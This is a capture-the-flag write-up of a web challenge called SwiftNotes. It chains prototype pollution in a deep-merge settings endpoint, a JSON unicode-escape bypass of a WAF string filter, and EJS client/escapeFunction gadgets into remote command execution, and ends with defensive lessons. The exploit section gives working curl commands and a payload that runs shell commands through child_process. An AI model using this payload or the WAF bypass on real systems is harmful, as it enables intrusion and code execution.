# SwiftNotes — Writeup

**Category:** Web
**Target:** http://144.217.91.111:3000
**Flag:** `CTF{5e038be14a277c1bf8b912e06de7d943}`

## 1. Challenge

SwiftNotes is a small Express/EJS "team note-taking" app. Users register,
write notes, and have a `settings` object (`theme`, `notifications`).
The description hints that the preferences-sync endpoint folds partial
client JSON into the server-side settings object — a classic setup for
**prototype pollution**.

## 2. Recon

Given source (`server.js` + `package.json`):

```js
const merge = require('./utils/merge');
...
app.post('/api/settings', requireAuth, (req, res) => {
  const user = users[req.session.username];
  merge(user.settings, req.body || {});
  res.json({ ok: true, settings: user.settings });
});
```

`utils/merge.js` was not shipped with the public source, but its behavior
is inferable (and confirmed live): it is a naive **recursive deep-merge**
that walks the source object with something like `for...in` and does
`target[key] = merge(target[key] || {}, source[key])` for nested objects,
**without blacklisting `__proto__` / `constructor` / `prototype`**.

Dependencies: `express ^4.18.2`, `ejs ^3.1.0`, `express-session ^1.17.3`.
No admin route, no role system is present anywhere in `server.js` —
confirmed live (`/admin`, `/api/admin`, `/flag`, etc. all 404). This told
us the vulnerability had to lead to **code execution** (RCE via the EJS
template engine), not to a hidden privilege check.

A reverse proxy (`openresty`) in front of the app runs a WAF that returns
`403 {"error":"request blocked by security policy"}` whenever the raw
request body contains certain literal substrings, notably `__proto__`
and `outputFunctionName`. This is bypassed trivially because JSON allows
`\uXXXX` escapes inside string/key literals: `"__proto__"` and
`"outputFunctionName"` parse to the exact same JS object keys after
`JSON.parse`, but don't match the WAF's literal string filter.

```
curl ... -d '{"__proto__":{"pollutedTest":"yes"}}'      -> 403 blocked
curl ... -d '{"__proto__":{"pollutedTest":"yes"}}'  -> 200 OK
```

## 3. The vulnerability

`merge(user.settings, req.body)` lets an authenticated user send
`{"__proto__": {...}}` as the JSON body. Because the merge function
recurses into `target[key]` for object values without checking
`hasOwnProperty`/blacklisting dangerous keys, sending
`__proto__.<anything>` mutates `Object.prototype` directly — a global,
process-wide prototype pollution, affecting every object in the Node
process from then on (not just the current user's settings).

This alone is only a DoS/data-integrity primitive — the real payoff is
that **EJS (the view engine used by `res.render`)** reads several of its
compile options via plain property access on an options object that is
not its own (`opts.outputFunctionName`, `opts.localsName`,
`opts.client`, `opts.escapeFunction`, `opts.destructuredLocals`, …)
without an `Object.prototype.hasOwnProperty` guard. These are documented
EJS "gadgets" for Prototype-Pollution-to-RCE (tracked e.g. in
mde/ejs#730, related to CVE-2022-29078). Because `app.render()` builds a
plain `{}` options object for every request, **a polluted
`Object.prototype` property is silently inherited and used by EJS on the
next render**, for every session.

Two gadgets were tested against this specific EJS build:

- `outputFunctionName` / `localsName` — **patched** in the deployed EJS
  version: both are validated with a `_JS_IDENTIFIER` regex before being
  spliced into the generated function source, so arbitrary code via
  these two is rejected (`Internal Server Error` is thrown instead).
- `client` + `escapeFunction` — **not validated**. Relevant EJS source
  (`lib/ejs.js`, `compile()`):

  ```js
  var escapeFn = opts.escapeFunction;
  ...
  if (opts.client) {
    src = 'escapeFn = escapeFn || ' + escapeFn.toString() + ';\n' + src;
    ...
  }
  ...
  fn = new ctor(opts.localsName + ', escapeFn, include, rethrow', src);
  ```

  If `opts.escapeFunction` is a **string** instead of a function (as
  supplied via pollution), `escapeFn.toString()` is `String.prototype
  .toString()`, which returns the string **verbatim, unescaped, and
  unquoted** — it gets spliced directly into the generated JS source
  that is passed to `new Function(...)`. This is unguarded raw code
  injection into every subsequent template compilation, as soon as
  `opts.client` is also truthy.

  And every `<%= expr %>` in a template compiles to
  `__append(escapeFn(expr))`, so once `escapeFn` is replaced by our own
  function, we control what text is interpolated for *every* escaped
  output in every rendered page (e.g. the `username` shown in the
  notes/settings nav bar).

## 4. Exploit

Register/login as a normal user (no special privileges needed — the
pollution is global, any authenticated account reaches it):

```bash
curl -s -c cookies.txt -X POST http://144.217.91.111:3000/register \
     -d "username=tester1&password=pass123"
```

Pollute `Object.prototype.client = true` and
`Object.prototype.escapeFunction = "<attacker function source>"`,
bypassing the WAF's literal-string filter with `\u` escapes in the JSON
keys:

```bash
python3 - <<'EOF'
import json
proto = "__pro\\u0074o__"
cmd = 'cat /data/flag.txt 2>&1'
fn = ('function(s){try{return process.mainModule.require("child_process")'
      '.execSync(' + json.dumps(cmd) + ',{maxBuffer:1024*1024}).toString()}'
      'catch(e){return String(e)}}')
body = '{"' + proto + '":{"client":true,"escapeFunction":' + json.dumps(fn) + '}}'
open('rce.json','w').write(body)
EOF

curl -s -b cookies.txt -X POST http://144.217.91.111:3000/api/settings \
     -H 'Content-Type: application/json' --data @rce.json
```

Note: `require` is **not** in scope inside a function created by the
`Function` constructor (it's module-scoped in Node, not global), so the
payload reaches Node's `child_process` module via the global `process`
object instead: `process.mainModule.require('child_process')`.

Trigger the render (any page that echoes `<%= username %>` or similar,
e.g. the nav bar on `/notes`) to execute our fake `escapeFn` and get the
command output reflected straight into the HTTP response:

```bash
curl -s -b cookies.txt http://144.217.91.111:3000/notes
```

```html
<a href="/logout">Logout (total 76
drwxr-xr-x   1 root root 4096 Oct 15 01:43 .
...
-r--r--r-- 1 root root   38 Oct 15 01:43 flag.txt   # (from `ls -la /data /app`)
)</a>
```

Final payload, reading the flag directly:

```bash
cmd = 'cat /data/flag.txt 2>&1'
```

Response (`/notes`, nav bar):

```html
<a href="/logout">Logout (CTF{5e038be14a277c1bf8b912e06de7d943}
)</a>
```

**Flag:** `CTF{5e038be14a277c1bf8b912e06de7d943}`

After extracting the flag, the pollution was reverted (best effort, it's
process-global and the live service was not restarted by us):

```bash
curl -s -b cookies.txt -X POST http://144.217.91.111:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"__proto__":{"client":false,"escapeFunction":null,"outputFunctionName":null,"localsName":"locals"}}'
```

Confirmed `/notes` rendered normally again (`Logout (tester1)`) after
the revert.

## 5. Lessons

- **Never deep-merge untrusted JSON into a long-lived object without
  blacklisting `__proto__`, `constructor`, and `prototype` keys** (or
  better: use `Object.create(null)` targets, `Map`, or a library with
  built-in prototype-pollution protection such as a merge that checks
  `Object.prototype.hasOwnProperty.call` on every key before recursing).
- **Prototype pollution in Node is process-wide and promotes trivially
  to RCE** whenever a templating engine, ORM, or other library reads
  unvalidated config options from a plain object (EJS's
  `outputFunctionName`/`localsName`/`client`+`escapeFunction`/
  `destructuredLocals` are a well-known gadget family). Keep `ejs`
  (and any templating engine) patched, and never let request-controlled
  data reach `res.render`'s option object, directly or via a polluted
  prototype.
- **WAF literal-string filtering is not a substitute for input
  validation.** JSON `\uXXXX` escapes inside key/string literals
  trivially defeat substring matching on the raw request body while
  being semantically identical after `JSON.parse`.
